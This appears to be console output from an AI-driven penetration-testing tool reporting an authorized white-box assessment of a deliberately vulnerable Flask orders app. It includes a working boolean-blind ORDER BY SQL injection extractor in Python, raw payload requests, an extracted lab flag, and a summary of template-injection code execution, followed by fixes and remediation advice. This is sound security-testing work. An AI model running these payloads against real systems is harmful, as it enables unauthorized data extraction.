+│  Because `ORDER BY` accepts any expression in SQLite, the payload *is* the   │
+│  sort expression and does not need to break out of a string literal. Two     │
+│  techniques demonstrate arbitrary read.                                      │
+│                                                                              │
+│  **Schema and projection discovery.** `sort=4` returns `HTTP 500` with `1st  │
+│  ORDER BY term out of range - should be between 1 and 3`, confirming a       │
+│  three-column projection and giving an error-based channel. A `UNION         │
+│  SELECT` is not available at this position (SQLite raises `ORDER BY clause   │
+│  should come after UNION not before`), so the proven channel is              │
+│  expression-based.                                                           │
+│                                                                              │
+│  **Boolean blind extraction of the non-projected `note` column.** The        │
+│  payload `(CASE WHEN (<predicate>) THEN id ELSE -id END)` is a legal `ORDER  │
+│  BY` expression. When the predicate is TRUE the response is ordered          │
+│  ascending by `id` (`1,2,3`); when FALSE it is ordered by `-id` (`3,2,1`).   │
+│  This is a stable oracle visible in the JSON ordering, with no error         │
+│  channel and no timing. Binary-searching `unicode(substr(note,i,1))`         │
+│  recovers the whole column:                                                  │
+│                                                                              │
+│  ```                                                                         │
+│  orders.id=1 note = 'flag{orderby_ok}'                                       │
+│  orders.id=2 note = 'nothing'                                                │
+│  orders.id=3 note = 'x'                                                      │
+│  sqlite_version() = 3.53.4                                                   │
+│  ```                                                                         │
+│                                                                              │
+│  The same oracle applied to `sqlite_master` flips the ordering in the TRUE   │
+│  case and not in the FALSE case, confirming arbitrary schema access through  │
+│  the same insertion point. Malformed input additionally produces a werkzeug  │
+│  traceback exposing the source path; that is supporting evidence of the      │
+│  interpolation, not the finding itself.                                      │
+│                                                                              │
+│  PoC Description                                                             │
+│  1. Start the application from a private working copy on a non-conflicting   │
+│  port so the workspace directory is untouched.                               │
+│  2. Send the benign baseline `GET /orders?sort=id` and record the three-row  │
+│  response as the negative control.                                           │
+│  3. Send `GET /orders?sort=4`. Observe `HTTP 500` and `1st ORDER BY term     │
+│  out of range - should be between 1 and 3`, establishing the injection       │
+│  point and the three-column projection.                                      │
+│  4. Send the boolean-TRUE payload `GET /orders?sort=(CASE WHEN (SELECT       │
+│  substr(note,1,5) FROM orders WHERE id=1)="flag{" THEN id ELSE -id END)`.    │
+│  Observe rows ordered `1,2,3`.                                               │
+│  5. Send the boolean-FALSE control with an identical payload shape but a     │
+│  false predicate (`="zzzz!"`). Observe rows ordered `3,2,1`. The ordering    │
+│  difference between steps 4 and 5 is the extraction oracle.                  │
+│  6. Run the automated binary-search extractor to recover `note` for every    │
+│  row plus `sqlite_version()`; results include `flag{orderby_ok}`.            │
+│  7. Repeat the oracle against `sqlite_master` to confirm schema access from  │
+│  the same injection point.                                                   │
+│                                                                              │
+│  PoC Code                                                                    │
+│  ```python                                                                   │
+│  import requests                                                             │
+│                                                                              │
+│  BASE = "http://127.0.0.1:8107/orders"                                       │
+│                                                                              │
+│                                                                              │
+│  def ask(predicate):                                                         │
+│      """True -> rows sorted by id ascending (1,2,3); False -> by -id         │
+│  (3,2,1)."""                                                                 │
+│      payload = f"(CASE WHEN ({predicate}) THEN id ELSE -id END)"             │
+│      rows = requests.get(BASE, params={"sort": payload}, timeout=10).json()  │
+│      return [r[0] for r in rows] == [1, 2, 3]                                │
+│                                                                              │
+│                                                                              │
+│  def extract(expr, maxlen=64):                                               │
+│      out = ""                                                                │
+│      for i in range(1, maxlen + 1):                                          │
+│          lo, hi = 32, 126                                                    │
+│          while lo < hi:                                                      │
+│              mid = (lo + hi) // 2                                            │
+│              if ask(f"unicode(substr(({expr}),{i},1))>{mid}"):               │
+│                  lo = mid + 1                                                │
+│              else:                                                           │
+│                  hi = mid                                                    │
+│          if lo < 32:                                                         │
+│              break                                                           │
+│          out += chr(lo)                                                      │
+│          if not ask(f"length(({expr}))>={i + 1}"):                           │
+│              break                                                           │
+│      return out                                                              │
+│                                                                              │
+│                                                                              │
+│  assert ask("1=1") is True and ask("1=2") is False   # oracle sanity check   │
+│                                                                              │
+│  for rid in (1, 2, 3):                                                       │
+│      print(f"orders.id={rid} note = {extract(f'SELECT note FROM orders       │
+│  WHERE id={rid}')!r}")                                                       │
+│                                                                              │
+│  print("sqlite_version() =", extract("SELECT sqlite_version()", 20))         │
+│                                                                              │
+│  schema = ask('(SELECT count(*) FROM sqlite_master WHERE type="table" AND    │
+│  name="orders")=1')                                                          │
+│  print("sqlite_master reachable:", schema)                                   │
+│  ```                                                                         │
+│                                                                              │
+│  Equivalent single-shot requests:                                            │
+│                                                                              │
+│  ```                                                                         │
+│  GET /orders?sort=id                                                         │
+│  GET /orders?sort=4                                                          │
+│  GET                                                                         │
+│  /orders?sort=(CASE+WHEN+(SELECT+substr(note,1,5)+FROM+orders+WHERE+id%3D1)  │
+│  %3D%22flag%7B%22+THEN+id+ELSE+-id+END)                                      │
+│  GET                                                                         │
+│  /orders?sort=(CASE+WHEN+(SELECT+substr(note,1,5)+FROM+orders+WHERE+id%3D1)  │
+│  %3D%22zzzz%21%22+THEN+id+ELSE+-id+END)                                      │
+│  ```                                                                         │
+│                                                                              │
+│  Code Locations                                                              │
+│                                                                              │
+│    Location 1: app.py:25-27                                                  │
+│    Reject non-allowlisted sort keys and order by the fixed SQL fragment      │
+│        sort = request.args.get("sort", "id")                                 │
+│      conn = sqlite3.connect(DB)                                              │
+│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
+│  {sort}").fetchall()                                                         │
+│    Fix:                                                                      │
+│    -     sort = request.args.get("sort", "id")                               │
+│      conn = sqlite3.connect(DB)                                              │
+│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
+│  {sort}").fetchall()                                                         │
+│    +     sort = request.args.get("sort", "id")                               │
+│      if sort not in SORT_COLUMNS:                                            │
+│          return jsonify({"error": "invalid sort column"}), 400               │
+│      conn = sqlite3.connect(DB)                                              │
+│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
+│  {SORT_COLUMNS[sort]}").fetchall()                                           │
+│                                                                              │
+│    Location 2: app.py:12                                                     │
+│    Add the sort-column allowlist constant                                    │
+│    DB = "/tmp/test-vuln-hard/orders.db"                                      │
+│    Fix:                                                                      │
+│    - DB = "/tmp/test-vuln-hard/orders.db"                                    │
+│    + DB = "/tmp/test-vuln-hard/orders.db"                                    │
+│                                                                              │
+│  SORT_COLUMNS = {"id": "id", "sku": "sku", "qty": "qty"}                     │
+│                                                                              │
+│  Remediation                                                                 │
+│  1. Never build SQL syntax from request data. `ORDER BY` cannot be           │
+│  parameterised on column names in SQLite, so map the user-supplied sort key  │
+│  through a fixed allowlist dictionary to hard-coded SQL fragments and        │
+│  reject anything not in the allowlist with a 400 before the query is built.  │
+│  2. Keep the allowlist as a module-level constant next to the schema so      │
+│  sortable columns are added deliberately rather than implicitly.             │
+│  3. Where a value rather than an identifier is needed in a query, always     │
+│  use `?` placeholders with tuple arguments, as in the companion fix for      │
+│  `POST /orders/by-sku`.                                                      │
+│  4. Add a regression test asserting that a non-allowlisted `sort` value      │
+│  returns 400 and never reaches the database, and that every documented sort  │
+│  key still returns correctly ordered rows.                                   │
+│  5. As defence in depth only, run the application with a least-privilege     │
+│  database account.                                                           │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+╭─ STRIX ──────────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Penetration test in progress                                                │
+│                                                                              │
+│  Model openai/strix-paid                                                     │
+│  Vulnerabilities 3                                                           │
+│  CRITICAL: 1 | HIGH: 2                                                       │
+│                                                                              │
+│  Input Tokens 13.7M  ·  Cached Tokens 13.5M                                  │
+│  Output Tokens 75.5K  ·  Cost $0.0000                                        │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+╭─ STRIX ──────────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Penetration test summary                                                    │
+│                                                                              │
+│  # Executive Summary                                                         │
+│                                                                              │
+│  An authorized white-box assessment of the Flask "orders" service at         │
+│  `/workspace/test-vuln-hard` identified **three confirmed, remotely          │
+│  exploitable injection vulnerabilities — one critical and two high** — with  │
+│  working proof-of-concept exploits executed against a running instance of    │
+│  the exact source.                                                           │
+│                                                                              │
+│  **Overall risk posture: Critical.** The application has no authentication,  │
+│  no authorization, and no input validation on any of its three routes, and   │
+│  every one of them hands attacker-controlled text to a dangerous sink.       │
+│                                                                              │
+│  **Key findings**                                                            │
+│  - A critical server-side template injection in `POST /render` gives         │
+│  unauthenticated remote code execution. Command output is returned directly  │
+│  in the HTTP response, and four independent exploitation paths were          │
+│  demonstrated, so no single code change in the template engine would         │
+│  contain it.                                                                 │
+│  - A high-severity SQL injection in `GET /orders?sort=` allows blind         │
+│  extraction of the entire database through a boolean ordering oracle,        │
+│  including a column the endpoint never projects.                             │
+│  - A high-severity SQL injection in `POST /orders/by-sku` allows a single    │
+│  request to dump every row of the table plus the schema definition.          │
+│                                                                              │
+│  **Business impact**                                                         │
+│  - Complete application compromise: reading application secrets and          │
+│  database contents, writing files, and pivoting to anything reachable from   │
+│  the host.                                                                   │
+│  - Confidentiality loss for all data the database account can read; the      │
+│  application's own tracebacks additionally disclose internal source paths.   │
+│  - The retained access log shows these same injection points were already    │
+│  driven by automated tooling in practice, including a completed extraction   │
+│  of a non-projectable column, so this is not a theoretical risk.             │
+│                                                                              │
+│  **Overarching remediation theme:** all three findings share one root cause  │
+│  — user input is concatenated into a language that executes (SQL query       │
+│  text, template source) instead of being passed as data. The fixes are       │
+│  small and local: bound query parameters, a column allowlist for the         │
+│  unavoidable `ORDER BY` case, and rendering user values as template *data*   │
+│  rather than template *source*. Every fix was written, applied to a working  │
+│  copy, and re-tested to confirm the exploit stops working while legitimate   │
+│  behaviour is preserved.                                                     │
+│                                                                              │
+│  # Methodology                                                               │
+│                                                                              │
+│  The assessment followed **OWASP WSTG** and **PTES** phases against a        │
+│  single locally-hosted source tree, in a **white-box** mode: full source     │
+│  review combined with live dynamic exploitation of a running instance of     │
+│  that source.                                                                │
+│                                                                              │
+│  **Scope:** the Flask application `app.py`, its SQLite data store, and the   │
+│  retained request log in the same directory. Testing was performed on        │
+│  private working copies bound to test ports; the in-scope source files were  │
+│  not modified, and the delivered patches are proposed through the reports    │
+│  rather than applied in place.                                               │
+│                                                                              │
+│  **Activities performed**                                                    │
+│  - **Source mapping and static analysis:** a complete rule-based static      │
+│  scan, a structural syntax-tree call map, a hardcoded-secret scan, and a     │
+│  dependency/configuration scan. Three independent tools converged on         │
+│  exactly the same three sinks, which establishes that the sink inventory is  │
+│  complete.                                                                   │
+│  - **Attack-surface enumeration:** exhaustive inventory of routes,           │
+│  handlers, and framework registration mechanisms, including confirmation     │
+│  that debug/console surfaces were not enabled.                               │
+│  - **Dynamic exploitation:** hand-built proof-of-concept payloads for each   │
+│  sink against a live instance, with matched benign baseline requests and     │
+│  negative controls for every claim (including controls that distinguish the  │
+│  actual template engine from the one the source comments claim).             │
+│  - **Evidence corroboration:** review of the retained access log for         │
+│  independent confirmation that the same injection points were exercised in   │
+│  practice and for evidence of any additional exploited weakness.             │
+│  - **Remediation and verification:** for each confirmed finding, a minimal   │
+│  root-cause patch was derived, applied to a working copy, and re-tested —    │
+│  confirming the exploit no longer succeeds, alternate payload classes are    │
+│  covered, and the legitimate request/response behaviour is preserved.        │
+│                                                                              │
+│  **Constraints:** the target ships no automated test suite, linter           │
+│  configuration, or CI, so repository-provided checks could not be run;       │
+│  validity of each patch was instead established by compiling and             │
+│  live-serving the patched module and exercising the full payload matrix.     │
+│  This is recorded as an explicit verification gap on each finding.           │
+│                                                                              │
+│  # Technical Analysis                                                        │
+│                                                                              │
+│  **Severity model:** ratings reflect demonstrated exploitability against a   │
+│  live instance, with confidentiality, integrity, and availability set only   │
+│  to the impact actually proven. Findings are: **1 Critical**, **2 High**.    │
+│                                                                              │
+│  **Confirmed findings**                                                      │
+│                                                                              │
+│  1. **Critical — Server-side template injection to remote code execution,    │
+│  `POST /render`** (CVSS 9.8). The `tpl` form field is passed as the          │
+│  *template source* to `render_template_string`, so the submitted value is    │
+│  compiled by the running Jinja2 environment instead of being rendered as     │
+│  data. A benign submission returns as plain text, while `{{7*7}}` returns    │
+│  `49`; escalation through framework globals reaches `os.popen(...)`, and     │
+│  the command output is returned in the response body (identity, host kernel  │
+│  banner, and contents of a file created outside the application were all     │
+│  retrieved). Four independent gadget chains succeeded, confirming there is   │
+│  no sandbox. The source comments describe the engine as Mako, which is       │
+│  incorrect and would have misdirected remediation; runtime fingerprinting    │
+│  identified Jinja2. Read-only, authentication-free, no user interaction.     │
+│                                                                              │
+│  2. **High — Blind SQL injection in `GET /orders?sort=`** (CVSS 7.5). The    │
+│  `sort` parameter is interpolated into an `ORDER BY` clause. Because the     │
+│  injection point is an expression position, a `UNION` is rejected by the     │
+│  database grammar; the effective technique is a conditional expression that  │
+│  flips the result ordering between true and false. That ordering difference  │
+│  is a stable boolean oracle, and binary search recovered the complete        │
+│  contents of a column the endpoint never projects, the database version,     │
+│  and schema metadata. Integrity and availability impact were not             │
+│  demonstrated and are scored accordingly.                                    │
+│                                                                              │
+│  3. **High — SQL injection in `POST /orders/by-sku`** (CVSS 7.5). The JSON   │
+│  body field `sku` is interpolated into a single-quoted string literal. A     │
+│  single request terminates the literal, discards the intended predicate,     │
+│  and unions the whole table — returning every row with its `note` values     │
+│  against a one-row benign baseline — and further requests retrieved the      │
+│  database version, aggregated data, and the table definition. Delivered as   │
+│  an ordinary JSON body, so query-string-only filtering would not have        │
+│  helped.                                                                     │
+│                                                                              │
+│  **Systemic root cause:** all three defects are the same class of error at   │
+│  three different sinks — untrusted text is placed into a language that is    │
+│  later *interpreted* (SQL query text, template source) rather than being     │
+│  passed through a data channel. The codebase applies no allowlisting, no     │
+│  parameter binding, and no separation of template from data anywhere.        │
+│                                                                              │
+│  **Compensating controls found:** essentially none. Debug mode is disabled,  │
+│  which removes the framework debugger console as an additional path, but     │
+│  tracebacks for unhandled database errors still disclose internal source     │
+│  paths. The only mitigations that bear on reach are deployment-level         │
+│  (loopback binding in the lab configuration) and do not change the           │
+│  weakness.                                                                   │
+│                                                                              │
+│  **Areas assessed and cleared**                                              │
+│  - The route inventory is closed: three routes only, no blueprints, no       │
+│  custom error handlers, no dynamic route registration.                       │
+│  - Three independent static analysis techniques produced no sink outside     │
+│  the three reported, including the absence of any command execution,         │
+│  deserialization, file handling, or path construction.                       │
+│  - Hardcoded-secret scanning produced no real credentials; the one apparent  │
+│  flag is a deliberate planted test marker, and other hits are synthetic      │
+│  probe URLs embedded in the log.                                             │
+│  - Dependency analysis does not apply: the target ships no manifest,         │
+│  lockfile, or container definition, and the installed framework versions     │
+│  are current.                                                                │
+│  - The retained access log shows no additional weakness was successfully     │
+│  exercised: no unexpected successful request to any non-application path,    │
+│  no successful file read, no code-execution artifact, and no credential      │
+│  disclosure. The tens of thousands of logged error tracebacks are a side     │
+│  effect of the three reported sinks, not an independent issue.               │
+│                                                                              │
+│  **Attack-chaining assessment:** chaining was considered and does not        │
+│  elevate the rating. The template injection already provides code execution  │
+│  as the service account, so it can read the application's data store and     │
+│  configuration directly — a stronger primitive than either SQL injection,    │
+│  which cannot execute code. Nor do the two SQL injections chain to anything  │
+│  beyond the database read they already demonstrate: the data store is a      │
+│  local file, so the SQL layer provides no path to the template sink or to    │
+│  the operating system. The findings are therefore independent, and the       │
+│  critical rating of the template injection already reflects the terminal     │
+│  impact an attacker would reach.                                             │
+│                                                                              │
+│  # Recommendations                                                           │
+│                                                                              │
+│  **Immediate (within days)**                                                 │
+│                                                                              │
+│  1. **Fix the template injection first** — it is unauthenticated remote      │
+│  code execution. Stop treating request input as template *source*: use a     │
+│  fixed, developer-controlled template and pass the submitted value in as a   │
+│  context variable so it can only be rendered as data. Do not attempt to      │
+│  solve this with payload filtering or blocklists. If a user-facing template  │
+│  editor is a genuine product requirement, that separate feature needs a      │
+│  sandboxed template environment with output autoescaping and an explicit     │
+│  allowlist of available objects and functions, and should be independently   │
+│  reviewed before exposure.                                                   │
+│  2. **Bind parameters on `POST /orders/by-sku`** — replace the               │
+│  string-literal interpolation with a positional placeholder and a value      │
+│  tuple. This is a one-line change that eliminates the entire injection       │
+│  class on that route.                                                        │
+│  3. **Allowlist the `GET /orders` sort key** — column names cannot be bound  │
+│  as parameters, so map the accepted public sort keys to fixed, hard-coded    │
+│  SQL fragments through a module-level constant and reject anything else      │
+│  with a client error before the query is built.                              │
+│  4. **Correct the misleading source documentation** that misidentifies the   │
+│  template engine; security guidance and detection rules written against the  │
+│  wrong engine will not protect the service.                                  │
+│                                                                              │
+│  **Short-term (within a release)**                                           │
+│                                                                              │
+│  5. **Sweep for the same pattern everywhere.** Grep for string formatting,   │
+│  concatenation, and `%` interpolation inside query strings and template      │
+│  compilation, and remove every instance. Add a lint rule or static-analysis  │
+│  gate that fails the build on interpolated SQL.                              │
+│  6. **Add regression tests for each fix** asserting that: a quote-and-union  │
+│  payload returns no rows; an injection-style sort key returns a rejection    │
+│  response rather than data; and a template-expression payload is rendered    │
+│  literally. Tests must be written so they fail against the vulnerable code.  │
+│  7. **Stop leaking internal detail on error.** The database error            │
+│  tracebacks disclose source paths; return a generic error response and log   │
+│  the detail server-side only.                                                │
+│                                                                              │
+│  **Medium-term (hardening)**                                                 │
+│                                                                              │
+│  8. **Introduce authentication and authorization** on all routes — the       │
+│  entire application is presently open to anyone who can reach the port.      │
+│  Even with the injections fixed, an unauthenticated data endpoint is an      │
+│  unnecessary exposure.                                                       │
+│  9. **Apply least privilege at the data layer:** run the service with a      │
+│  database account or file permissions limited to the tables and operations   │
+│  it actually needs, and open connections read-only where the route only      │
+│  reads.                                                                      │
+│  10. **Reduce blast radius of any future code execution:** run the service   │
+│  as a dedicated unprivileged account in an isolated environment with egress  │
+│  restrictions, and keep the debugger and interactive consoles disabled in    │
+│  every environment.                                                          │
+│  11. **Bind to loopback or a management network** unless the service is      │
+│  intended to be publicly reachable, and place a request-size and rate limit  │
+│  in front of the rendering route.                                            │
+│                                                                              │
+│  **Retest and validation**                                                   │
+│                                                                              │
+│  After remediation, re-run the original payload set against the patched      │
+│  build to confirm: the template-expression payloads render literally with    │
+│  no command output; the conditional-ordering oracle returns no true/false    │
+│  distinction; the union payload returns an empty result; and all legitimate  │
+│  requests return the same responses, in the same shape, as before the        │
+│  change. Also confirm the three new regression tests fail when reverted,     │
+│  proving they actually guard the fixes.                                      │
+│                                                                              │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+
+
+╭─ STRIX ──────────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Penetration test completed                                                  │
+│                                                                              │
+│  Target  /tmp/test-vuln-hard                                                 │
+│  Vulnerabilities  CRITICAL: 1 | HIGH: 2 (Total: 3)                           │
+│                                                                              │
+│  Input Tokens 13.7M  ·  Cached Tokens 13.5M  ·  Output Tokens 75.5K          │
+│                                                                              │
+│  Output  /opt/ares/strix/strix_runs/test-vuln-hard_424b                      │
+│                                                                              │
+│  View    strix view test-vuln-hard_424b                                      │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+strix.ai  ·  docs.strix.ai  ·  discord.gg/strix-ai
+
